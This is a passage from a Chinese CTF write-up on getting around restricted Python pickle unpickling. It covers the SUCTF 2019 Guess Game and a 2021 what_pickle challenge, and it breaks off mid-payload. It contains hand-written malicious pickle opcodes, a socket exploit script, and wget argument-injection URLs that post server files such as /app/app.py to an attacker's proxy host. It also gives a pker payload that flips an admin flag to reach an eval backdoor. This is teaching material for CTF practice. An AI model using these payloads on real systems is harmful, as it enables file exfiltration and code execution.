</span></span></code></pre></div></li></ul></li></ul><p>先对题目有大概思路，然后辅以工具~好耶</p><h3 id=工具二连---uanapickleuhttpsgithubcomsensepostanapickle>工具二连 - <a href=https://github.com/sensepost/anapickle><u>anapickle</u></a></h3><p>其实一个年龄很大的脚本了，支持python2.3。。。。但是包含了很多payload，可以灵活运用~</p><h2 id=bypass>bypass!!!</h2><h3 id=对类型的检查>对类型的检查</h3><p>可以在已经构造好的opcode后面去掉<code>.</code>再续上相应的对象的opcode，作为栈顶的值供检查</p><h3 id=限制bc对模块的引入---find_class的重写>限制<code>b'c'</code>对模块的引入 - <code>find_class()</code>的重写</h3><p>修改<code>find_class()</code>会引入函数&模块的白名单，一定程度上解决pickle的安全性问题；以下两种情况会调用<code>find_class()</code>的检查：</p><ul><li>opcode角度：出现<code>c</code>, <code>i</code>, <code>b'\x93'</code>会调用</li><li>python角度：find_class()只会在解析opcode时调用一次，只要绕过opcode的执行过程，之后再产生的函数在黑名单中也不会拦截（比如通过<code>__import__</code>来绕过）</li></ul><h3 id=--仅可以引入__main__开头的模块>&ndash;&#187;仅可以引入<code>__main__</code>开头的模块</h3><p>“通过GLOBAL指令引入的变量可以看作是原变量的引用，我们在栈上修改它的值，也会修改原变量”，基于这一原理，当<code>c</code>指令只允许<code>__main__</code>时，我们可以引入<code>__main__.blue</code>（blue见题行事 上下文中会提前引入）这个module，再将一个dict压入栈，内容是<code>{'name': 'rua', 'grade': 'www'}</code>；之后执行BUILD指令，将会改写<code>__main__.blue.name</code>和 <code>__main__.blue.grade</code>，此时已经执行了我们想要的变量覆盖。之后弹掉栈顶，现在为空栈，拼接上正常的Student对象序列化后的opcode。此时的完整opcode在被反序列化时，栈顶是正常的Student对象，而被执行时却会先执行一遍前面的过程，造成变量覆盖。</p><p>既然我们可以做到重写变量的值，那也可以将这个值改为read wrapper的返回值做到任意文件读取（详见后面的内容）</p><h3 id=--仅可以引入题目中自设的模块模块名不能有__符>&ndash;&#187;仅可以引入题目中自设的模块&模块名不能有<code>__</code>符</h3><details><summary><h4 class=inline>栗子2 - [SUCTF 2019]Guess Game</h4></summary><p>本地复现还是失败，无解，docker地址->https://github.com/rmb122/suctf2019_guess_game<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809115950444.png alt=image-20210809115950444></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130400358.png alt=image-20210809130400358></p><p>是个猜数游戏，交互逻辑在init.py, Game.py和Ticket.py中，10以内的数字需要猜对10次（全胜）才会返回flag</p><p>然后是game_client.py</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130523878.png alt=image-20210809130523878></p><p>接收数字的输入作为参数生成Ticket对象，序列化后发送到server端</p><p>再看game_server.py，用了重写了的<code>find_class()</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130933730.png alt=image-20210809130933730></p><p>这个限制的意思是导入的模块只能以guess_name开头并且名字里没有<code>__</code></p><p>大概看完了流程，接下来找找突破口——序列化时是生成一个Ticket的实例</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132300981.png alt=image-20210809132300981></p><p>判断输赢则是需要Game辅助</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132437175.png alt=image-20210809132437175></p><p>结合game_server.py的判断条件，拿到flag需要<code>self.win_count == max_round == 10</code></p><p>那么构造的方向有了——修改相关参数做到变量覆盖，再以序列化的opcode形式传过去。手写opcode面临的问题就是重写<code>find_class()</code>后对加载指定模块的限制，而这里我们可以看到<code>__init__.py</code>中<code>game = Game()</code>，所以直接可以通过<code>guess_game.game</code>引入<code>Game()</code>类，然后修改类中的win_count和round_count就能做到变量覆盖；第二要注意必须手写opcode，如果是先<code>from guess_name import game</code>，然后修改参数后再dump，则是在运行时重新新建一个Game对象，就不是从guess_game这个module中获取，破坏上下文；第三要注意</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809140423900.png alt=image-20210809140423900></p><p>pickle序列化流执行完会把栈顶的值返回，所以栈顶需要设为Ticket，这里可以dumps一个Ticket，然后拼到之前手写的opcode之后</p><p>opcodes:</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 修改win_count = 10和round_count = 9，传过去之后执行一次round_count += 1就能全胜</span>
</span></span><span style=display:flex><span><span style=color:#111>cguess_name</span>
</span></span><span style=display:flex><span><span style=color:#111>game</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span><span style=color:#111>S</span><span style=color:#d88200>&#34;win_count&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>I10</span>
</span></span><span style=display:flex><span><span style=color:#111>sS</span><span style=color:#d88200>&#34;round_count&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>I9</span>
</span></span><span style=display:flex><span><span style=color:#111>sbcguess_game</span><span style=color:#f92672>.</span><span style=color:#111>Ticket</span>\<span style=color:#111>nTicket</span>\<span style=color:#111>nq</span>\<span style=color:#111>x00</span><span style=color:#111>)</span>\<span style=color:#111>x81q</span>\<span style=color:#111>x01</span><span style=color:#111>}</span><span style=color:#111>q</span>\<span style=color:#111>x02X</span>\<span style=color:#111>x06</span>\<span style=color:#111>x00</span>\<span style=color:#111>x00</span>\<span style=color:#111>x00numberq</span>\<span style=color:#111>x03K</span>\<span style=color:#111>x06sb</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># c之后是被find_class()监控的区域，拼接Ticket</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>socket</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>struct</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>s</span> <span style=color:#f92672>=</span> <span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>socket</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>connect</span><span style=color:#111>((</span><span style=color:#d88200>&#39;node4.buuoj.cn&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>28803</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>exp</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;&#39;&#39;cguess_game
</span></span></span><span style=display:flex><span><span style=color:#d88200>game
</span></span></span><span style=display:flex><span><span style=color:#d88200>}S&#34;win_count&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>I10
</span></span></span><span style=display:flex><span><span style=color:#d88200>sS&#34;round_count&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>I9
</span></span></span><span style=display:flex><span><span style=color:#d88200>sbcguess_game.Ticket</span><span style=color:#8045ff>\n</span><span style=color:#d88200>Ticket</span><span style=color:#8045ff>\n</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x00</span><span style=color:#d88200>)</span><span style=color:#8045ff>\x81</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>}q</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x06\x00\x00\x00</span><span style=color:#d88200>numberq</span><span style=color:#8045ff>\x03</span><span style=color:#d88200>K</span><span style=color:#8045ff>\x06</span><span style=color:#d88200>sb.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#111>struct</span><span style=color:#f92672>.</span><span style=color:#111>pack</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&gt;I&#39;</span><span style=color:#111>,</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>exp</span><span style=color:#111>)))</span>
</span></span><span style=display:flex><span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#111>exp</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>1024</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>1024</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>1024</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>1024</span><span style=color:#111>))</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809144613834.png alt=image-20210809144613834></p><p>————用pker</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>ticket</span> <span style=color:#f92672>=</span> <span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#39;guess_game.Ticket&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Ticket&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>0</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>game</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;guess_game&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;game&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>game</span><span style=color:#f92672>.</span><span style=color:#111>curr_ticket</span> <span style=color:#f92672>=</span> <span style=color:#111>ticket</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span> <span style=color:#111>ticket</span>
</span></span><span style=display:flex><span><span style=color:#75715e># b&#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&#39;curr_ticket&#39;\ng0\ndtbg0\n.&#34;</span>
</span></span></code></pre></div></details><details><summary><h4 class=inline>栗子3 - [巅峰极客 2021]what_pickle</h4></summary><p>登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现</p><p>/images可以看到开着的debug界面</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png alt=image-20211024174438862></p><p>能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来</p><pre tabindex=0><code>/images?image=&amp;argv=--post-file=/app/app.py&amp;argv=--execute=http_proxy=http://ip:port
</code></pre><pre tabindex=0><code>/images?image=&amp;argv=—post-file=/app/app.py&amp;argv=-e http_proxy=http://ip:port
</code></pre><p>依次读出/app/app.py和/app/config.py</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># app.py</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>flask</span> <span style=color:#f92672>import</span> <span style=color:#111>Flask</span><span style=color:#111>,</span> <span style=color:#111>request</span><span style=color:#111>,</span> <span style=color:#111>session</span><span style=color:#111>,</span> <span style=color:#111>render_template</span><span style=color:#111>,</span> <span style=color:#111>url_for</span><span style=color:#111>,</span><span style=color:#111>redirect</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>io</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>sys</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>random</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>subprocess</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>ctypes</span> <span style=color:#f92672>import</span> <span style=color:#111>cdll</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>config</span> <span style=color:#f92672>import</span> <span style=color:#111>SECRET_KEY</span><span style=color:#111>,</span> <span style=color:#111>notadmin</span><span style=color:#111>,</span><span style=color:#111>user</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>cdll</span><span style=color:#f92672>.</span><span style=color:#111>LoadLibrary</span><span style=color:#111>(</span><span style=color:#d88200>&#34;./readflag.so&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>app</span> <span style=color:#f92672>=</span> <span style=color:#111>Flask</span><span style=color:#111>(</span><span style=color:#111>__name__</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>config</span><span style=color:#f92672>.</span><span style=color:#111>update</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span>
</span></span><span style=display:flex><span>    <span style=color:#111>SECRET_KEY</span><span style=color:#f92672>=</span><span style=color:#111>SECRET_KEY</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>RestrictedUnpickler</span><span style=color:#111>(</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>Unpickler</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>find_class</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>module</span> <span style=color:#f92672>in</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;config&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>and</span> <span style=color:#d88200>&#34;__&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#111>name</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>modules</span><span style=color:#111>[</span><span style=color:#111>module</span><span style=color:#111>],</span> <span style=color:#111>name</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>raise</span> <span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>UnpicklingError</span><span style=color:#111>(</span><span style=color:#d88200>&#34;global &#39;</span><span style=color:#d88200>%s</span><span style=color:#d88200>.</span><span style=color:#d88200>%s</span><span style=color:#d88200>&#39; is forbidden&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span><span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>restricted_loads</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;&#34;&#34;Helper function analogous to pickle.loads().&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>RestrictedUnpickler</span><span style=color:#111>(</span><span style=color:#111>io</span><span style=color:#f92672>.</span><span style=color:#111>BytesIO</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>))</span><span style=color:#f92672>.</span><span style=color:#111>load</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>@app.route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>@app.route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/index&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>index</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>None</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#111>url_for</span><span style=color:#111>(</span><span style=color:#d88200>&#39;home&#39;</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index.html&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>@app.route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>,</span> <span style=color:#111>methods</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#34;POST&#34;</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>login</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;test&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>User</span> <span style=color:#f92672>=</span> <span style=color:#111>user</span><span style=color:#111>(</span><span style=color:#111>name</span><span style=color:#111>,</span><span style=color:#111>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#34;info&#34;</span><span style=color:#111>]</span><span style=color:#f92672>=</span><span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>User</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#111>url_for</span><span style=color:#111>(</span><span style=color:#d88200>&#39;home&#39;</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>@app.route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/home&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>home</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>info</span> <span style=color:#f92672>=</span> <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#34;info&#34;</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>User</span> <span style=color:#f92672>=</span> <span style=color:#111>restricted_loads</span><span style=color:#111>(</span><span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64decode</span><span style=color:#111>(</span><span style=color:#111>info</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#111>Jpg_id</span> <span style=color:#f92672>=</span> <span style=color:#111>random</span><span style=color:#f92672>.</span><span style=color:#111>randint</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span><span style=color:#ae81ff>5</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;home.html&#39;</span><span style=color:#111>,</span><span style=color:#111>id</span> <span style=color:#f92672>=</span> <span style=color:#111>str</span><span style=color:#111>(</span><span style=color:#111>Jpg_id</span><span style=color:#111>),</span> <span style=color:#111>info</span> <span style=color:#f92672>=</span> <span style=color:#111>User</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>@app.route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/images&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>images</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>command</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#34;wget&#34;</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>argv</span><span style=color:#f92672>=</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#f92672>.</span><span style=color:#111>getlist</span><span style=color:#111>(</span><span style=color:#d88200>&#39;argv&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>true_argv</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#111>x</span> <span style=color:#00a8c8>if</span> <span style=color:#111>x</span><span style=color:#f92672>.</span><span style=color:#111>startswith</span><span style=color:#111>(</span><span style=color:#d88200>&#34;-&#34;</span><span style=color:#111>)</span> <span style=color:#00a8c8>else</span> <span style=color:#d88200>&#39;--&#39;</span><span style=color:#f92672>+</span><span style=color:#111>x</span> <span style=color:#00a8c8>for</span> <span style=color:#111>x</span> <span style=color:#f92672>in</span> <span style=color:#111>argv</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>image</span><span style=color:#f92672>=</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#111>[</span><span style=color:#d88200>&#39;image&#39;</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>command</span><span style=color:#f92672>.</span><span style=color:#111>extend</span><span style=color:#111>(</span><span style=color:#111>true_argv</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>command</span><span style=color:#f92672>.</span><span style=color:#111>extend</span><span style=color:#111>([</span><span style=color:#d88200>&#34;-q&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;-O&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;-&#34;</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span>    <span style=color:#111>command</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://127.0.0.1:8080/&#34;</span><span style=color:#f92672>+</span><span style=color:#111>image</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>image_data</span> <span style=color:#f92672>=</span> <span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#111>command</span><span style=color:#111>,</span><span style=color:#111>stdout</span><span style=color:#f92672>=</span><span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>PIPE</span><span style=color:#111>,</span><span style=color:#111>stderr</span><span style=color:#f92672>=</span><span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>PIPE</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>image_data</span><span style=color:#f92672>.</span><span style=color:#111>stdout</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#111>host</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#111>debug</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>,</span> <span style=color:#111>port</span><span style=color:#f92672>=</span><span style=color:#ae81ff>80</span><span style=color:#111>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># config.py</span>
</span></span><span style=display:flex><span><span style=color:#111>SECRET_KEY</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>notadmin</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#34;admin&#34;</span><span style=color:#111>:</span><span style=color:#d88200>&#34;no&#34;</span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>user</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__init__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>username</span> <span style=color:#f92672>=</span> <span style=color:#111>username</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>data</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>backdoor</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>isinstance</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>,</span><span style=color:#111>list</span><span style=color:#111>)</span> <span style=color:#f92672>and</span> <span style=color:#111>notadmin</span><span style=color:#111>[</span><span style=color:#d88200>&#34;admin&#34;</span><span style=color:#111>]</span><span style=color:#f92672>==</span><span style=color:#d88200>&#34;yes&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>s</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>eval</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数<code>eval()</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 用pker.py生成payload</span>
</span></span><span style=display:flex><span><span style=color:#111>s</span><span style=color:#f92672>=</span><span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#34;config&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;notadmin&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>s</span><span style=color:#111>[</span><span style=color:#d88200>&#34;admin&#34;</span><span style=color:#111>]</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;yes&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>user</span><span style=color:#f92672>=</span><span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#34;config&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;user&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>user</span><span style=color:#f92672>.</span><span style=color:#111>username</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;tyskill&#34;</span>
